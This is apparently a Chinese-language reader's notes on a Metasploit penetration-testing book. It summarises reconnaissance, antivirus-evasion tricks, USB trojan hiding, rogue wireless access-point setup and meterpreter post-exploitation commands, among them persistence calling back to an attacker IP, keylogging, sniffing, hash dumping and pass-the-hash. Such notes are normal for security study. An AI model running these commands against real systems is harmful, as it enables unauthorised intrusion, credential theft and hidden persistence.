# 《metasploit渗透测试》读后感

> 这是我读的第一本成体系的渗透测试的书籍，可以说从渗透测试的各个阶段进行了展开分析，包括 信息收集、web漏洞利用、无线攻击、客户端攻击、后渗透流程等等。其中，我对于比较感兴趣的部分进行了摘抄，方便以后查看补充。

## 0x01 信息收集
###  外围信息收集

- whois域名注册信息查询

  > 注: whois查询的时候需要去掉前缀

- nslookup与dig域名查询

- ip2location地理位置(国外: GEOIP,国内: cz88,纯真数据库)

- netcraft网站(子域查询)

- ip2location反查域名，`ip-address.com`（7c.com）

### 搜索引擎使用

- `Google Hacking`(siteDigger , search diggity) GHDB

  > parent directory site: +网站
  >
  > filetype: xls 

- 目录扫描

- 特定类型文件

- 搜索网络中的邮箱

  > MSF中的 search_email_collector

### 主机探测与端口扫描

- ICMP ping

- msf

  > arp_sweep: arp请求枚举存活主机
  >
  > udp_sweep: udp数据包

- nmap

  > -sn: 不对开放端口扫描
  >
  > -PU udp扫描
  >
  > -O 判断目标操作系统
  >
  > -A 详细服务和系统信息
  >
  > -sV 服务版本
  >
  > -p 扫描端口
  >
  > -Pn 禁止使用icmp协议

- msf---portscan

- psnnuffle 口令嗅探

## 0x02 免杀

- 加密免杀
- 加壳免杀
- 修改特征码免杀

> 1. 16进制的数据特征码直接修改法
> 2. 字符串大小写修改法
> 3. 等价替换法
> 4. 指令顺序调换法
> 5. 通用跳转法

## 0x03 社工攻击

> SET 社工攻击包

- U盘下隐藏木马文件

  > 1. 作为系统文件隐藏
  > 2. 伪装成其他文件
  > 3. 藏于系统文件夹中
  > 4. 运行windows runau为.....\

- 常用工具

  > 1. Hacksaw
  > 2. Teensy USB HID
  > 3. Switch blade



## 0x04 无线安全

`Aircrack-ng:破解密码常用`===>`杨哲: 《无线网络安全攻防实战》+《进阶》`

`ssh_login http_login`

- 无线AP漏洞利用路径

  > 渗透无线AP固件==》 客户端主机的流量劫持到自己架设的恶意AP==》访问渗透攻击页面

- 架设一个恶意AP

  > 1. 插上USB网卡, ifconfig , iwconfig
  > 2. airmon-ng start wlan0： 将网卡设置为监听模式
  > 3. airbase-ng: 假设假冒的AP
  > 4. 配置DHCP
  > 5. karma.rc(一键配置恶意AP的msf)



## 0x05 meterpreter命令

portfwd: 端口转发 `portfwd add -l 1234 -p 3389 -r`

route : 查看路由

execute: `-H -m -d calc.exe -f wce.exe -a 参数`

persistence: 后渗透攻击模块`run persistence -X -i S -p 443 -r {ip}`

`metsrc模型`

## 0x06 权限提升

信息窃取: `run post/windows/gather/dumplinks keyscan_start`：键击记录

数据包嗅探: `use sniffer ` 

> 1. sniffer_interfaces
> 2. sniffer_start 1
> 3. sniffer_dump 1
> 4. sniffer_stop interfaces

smart_hashdump

psexec: 哈希重放攻击

- 添加路由;

  >  run get_local_subnets
  >
  > route add ____
